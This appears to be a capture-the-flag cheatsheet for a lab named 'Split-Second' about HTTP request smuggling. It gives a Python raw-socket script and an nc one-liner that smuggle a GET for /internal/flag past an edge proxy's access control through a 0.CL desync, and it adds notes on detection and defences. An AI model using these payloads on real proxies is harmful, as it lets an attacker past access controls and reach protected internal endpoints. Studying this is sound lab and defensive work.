# Cheatsheet — Split-Second

## Targets

- **app01** — edge proxy on :80 → backend on a private docker net.
  `/internal/*` is ACL-blocked at the edge.

## Useful commands

```bash
# raw socket — the only way to control exact bytes
python3 - <<'PY'
import socket
s = socket.create_connection(("app01", 80))
s.send(b"POST /track HTTP/1.1\r\nHost: app01\r\nContent-Length: 0\r\n\r\n"
       b"GET /internal/flag HTTP/1.1\r\nHost: x\r\n\r\n")
print(s.recv(8192).decode())
PY

printf 'POST /track HTTP/1.1\r\nContent-Length: 0\r\n\r\nGET /internal/flag HTTP/1.1\r\n\r\n' | nc app01 80
```

## Concepts

- **0.CL desync**: front-end sees `Content-Length: 0` → "no body" → passes
  the socket on. The bytes you appended anyway are the backend's *next*
  request — it never saw your ACL check.
- Detection idea: send an ambiguous request and watch for a response that
  belongs to a request you "never sent" (queue desync / extra response).
- `Connection: keep-alive` backend + head-only-parsing frontend = the
  classic pair. Defenses: strict parsing both ends, or kill keep-alive.
